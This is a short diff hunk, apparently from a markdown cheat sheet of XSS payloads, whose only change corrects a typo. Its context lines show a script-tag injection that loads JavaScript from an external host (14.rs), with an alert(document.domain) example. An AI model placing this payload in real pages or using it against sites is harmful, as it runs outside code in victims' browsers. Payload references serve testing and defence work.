@@ -92,7 +92,7 @@ XSS for HTML5
 XSS using script tag (external payload)
 ```javascript
 <script src=14.rs>
-you can alsoo specify an arbitratry payload with 14.rs/#payload
+you can also specify an arbitratry payload with 14.rs/#payload
 e.g: 14.rs/#alert(document.domain)
 ```
 
